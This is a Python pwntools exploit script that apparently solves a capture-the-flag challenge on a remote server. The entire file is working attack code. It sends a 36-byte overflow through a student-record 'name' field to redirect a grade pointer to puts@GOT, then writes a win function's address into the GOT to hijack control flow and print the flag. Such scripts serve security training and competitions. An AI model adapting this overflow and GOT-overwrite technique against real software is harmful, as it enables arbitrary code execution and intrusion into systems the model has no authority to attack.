from pwn import *

# Addresses
win_addr = 0x08049316
puts_got = 0x0804c02c

# Connect
p = remote('host5.metaproblems.com', 5035)

# Receive initial output
print(p.recvuntil(b'> ').decode())

# Step 1: Create student 0
p.sendline(b'1')
print(p.recvuntil(b'?').decode())
p.sendline(b'TestName')
print(p.recvuntil(b'?').decode())
p.sendline(b'12')
print(p.recvuntil(b'?').decode())
p.sendline(b'3.5')
print(p.recvuntil(b'> ').decode())

# Step 2: Modify student 0, option 1 - overwrite grade_ptr with puts@GOT
p.sendline(b'3')  # Modify student
print(p.recvuntil(b'?').decode())
p.sendline(b'0')   # Student 0
print(p.recvuntil(b'?').decode())
p.sendline(b'1')   # Option 1: name

# Payload: 36 bytes + puts@GOT address
payload = b'A' * 36 + p32(puts_got)
print(p.recvuntil(b': ').decode())
p.sendline(payload)

# Catch any output
try:
    print(p.recvuntil(b'> ', timeout=2).decode())
except:
    pass

# Step 3: Modify student 0, option 2 - write win address to puts@GOT
p.sendline(b'3')  # Modify student
try:
    print(p.recvuntil(b'?', timeout=2).decode())
except:
    pass
p.sendline(b'0')   # Student 0
try:
    print(p.recvuntil(b'?', timeout=2).decode())
except:
    pass
p.sendline(b'2')   # Option 2: grade level
try:
    print(p.recvuntil(b': ', timeout=2).decode())
except:
    pass
p.sendline(str(win_addr).encode())

# Receive all remaining output (flag should be here!)
try:
    print(p.recvall(timeout=2).decode())
except:
    pass

p.close()
